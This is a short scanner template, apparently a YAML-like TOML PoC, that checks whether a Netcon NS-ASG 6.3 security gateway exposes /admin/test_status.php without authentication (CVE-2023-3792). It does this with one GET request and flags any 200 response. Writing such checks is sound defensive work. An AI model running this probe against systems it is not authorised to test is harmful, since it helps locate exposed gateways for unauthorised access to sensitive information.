[info]
author = "AVE"
description = "检测网康 NS-ASG 6.3 安全网关 /admin/test_status.php 是否存在未授权访问漏洞。未经认证的攻击者可直接访问该接口获取敏感信息。"
id = "POC-AVE-2023-0001"
name = "网康 NS-ASG 安全网关 /admin/test_status.php 未授权访问 PoC"
severity = "medium"
tags = [
    "cve-2023-3792",
    "ns-asg",
    "unauthorized-access",
]
vuln_id = [
    "CVE-2023-3792",
    "AVE-2023-0001",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/admin/test_status.php"
protocol = "http"

[poc.requests.headers]
User-Agent = "Mozilla/5.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
